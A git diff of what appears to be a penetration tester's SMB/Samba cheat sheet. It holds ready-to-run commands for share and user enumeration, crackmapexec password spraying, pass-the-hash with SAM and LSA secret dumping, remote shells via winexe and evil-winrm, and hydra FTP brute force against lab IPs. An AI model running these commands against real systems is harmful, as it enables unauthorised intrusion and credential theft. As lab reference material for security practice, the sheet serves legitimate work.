@@ -1,32 +1,46 @@
 =================================== 
-Samba 
+139/445 SMB Samba
 
 sudo nmap -p 445 --script=smb-enum-shares,smb-enum-users 192.168.200.5 
-sudo nmap --script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,smb-protocols,smb2-time.nse,smb-psexec,smb2-vuln-uptime,smb-security-mode,smb-server-stats,smb-double-pulsar-backdoor,smb-system-info,smb-vuln-conficker,smb-enum-groups,smb-vuln-cve2009-3103,smb-enum-processes,smb-vuln-cve-2017-7494,smb-vuln-ms06-025,smb-enum-shares,smb-vuln-ms07-029,smb-enum-users,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-ls,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-os-discovery --script-args=unsafe=1 -T5 192.168.200.5 -oG nmap-smb
+sudo nmap --script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,smb-protocols,smb2-time.nse,smb-psexec,smb2-vuln-uptime,smb-security-mode,smb-server-stats,smb-double-pulsar-backdoor,smb-system-info,smb-vuln-conficker,smb-enum-groups,smb-mbenum,smb-vuln-cve2009-3103,smb-enum-processes,smb-vuln-cve-2017-7494,smb-vuln-ms06-025,smb-enum-shares,smb-vuln-ms07-029,smb-enum-users,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-ls,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-os-discovery,smb-vuln-regsvc-dos  --script-args=unsafe=1 -T5 192.168.200.5 -p 445 | tee nmap-smb
 
+=================================== 
 enum4linux -a 192.168.200.5
 
+=================================== 
+smbmap -H 192.168.200.5
+smbmap -H 192.168.200.5 -R --depth 5 
+smbmap -H 192.168.200.5 -u '' -p '' 
+smbmap -H 192.168.200.5 -u admin -p 'creds' -d friendzone  
+
+=================================== 
 smbclient -L 192.168.200.5 
 smbclient -L 192.168.200.5 -p12445
 smbclient -L //192.168.200.5  
 smbclient -L //192.168.200.5/ -U "guest"
+
 smbclient //192.168.200.5/share 
-smbclient //192.168.200.5/share -U admin  
+smbclient //192.168.200.5/share -U admin
+smbclient \\\\192.168.200.5\\ipc$ -U admin
 dir  
 mask "" 
 recurse ON  
 prompt OFF 
 mget *
 
-smbmap -H 192.168.200.5
-smbmap -H 192.168.200.5 -R --depth 5 
-smbmap -H 192.168.200.5 -u '' -p '' 
-smbmap -H 192.168.200.5 -u admin -p 'creds' -d friendzone  
+=================================== 
+Find Users
+
+rpcclient 192.168.200.5 -U '' 
+srvinfo
+enumdomusers
+getdompwinfo
+querydominfo
+netshareenum
+netshareenumall
 
 
 ================================== 
-Samba: Crackmapexec 
-
 crackmapexec --help 
 crackmapexec smb 192.168.200.5
 crackmapexec smb 192.168.200.5 --shares -u '' -p '' 
@@ -38,32 +52,26 @@ crackmapexec winrm 192.168.200.5 -u bob -p 'paxxword'
 crackmapexec smb 192.168.200.5 --pass-pol 
 crackmapexec smb 192.168.200.5 -u guest -p "" --shares 
 crackmapexec smb 192.168.200.5 -u guest -p "" -M spider_plus 
+
 crackmapexec smb 192.168.200.5 -d mydom -u users.txt -p pass.txt    ..brute too 
 crackmapexec smb 192.168.200.5 10.0.0.1 10.1.1.2 -u bob -p 'paxxword' --local-auth 
 crackmapexec smb 192.168.200.5 -u bob -p 'paxxword'    ..test password, get domain info 
 crackmapexec smb 192.168.200.5 10.1.1.2 -u bob -p 'paxxword' -d mydomain 
 crackmapexec smb 192.168.200.5 10.1.1.2 -u bob -H ntlmhash -d mydomain 
 
-evil-winrm -i 192.168.200.5 -u bob -p paxxword
 crackmapexec smb 192.168.200.5 -u bob -p 'paxxword' --shares 
 crackmapexec smb 192.168.200.5 -d mydomain -u bob -H ntlmhash --sam 
 crackmapexec smb 192.168.200.5 -d mydomain -u bob -H ntlmhash --lsa 
 
 
 =================================== 
-sambascan 
-Search an entire network or hosts for SMB shares, and list public-share contents 
+Samba Shell:
+winexe -U username //192.168.200.5 "cmd.exe" --system
+evil-winrm -i 192.168.200.5 -u bob -p paxxword
 
 =================================== 
 Reuse samba-creds for FTP
 hydra -l steph -P $rockyou 192.168.200.5 ftp
-
-=================================== 
-Find Users
-
-rpcclient 192.168.200.5 -U '' 
-r> enumdomusers 
-
 
 =================================== 
 NFS
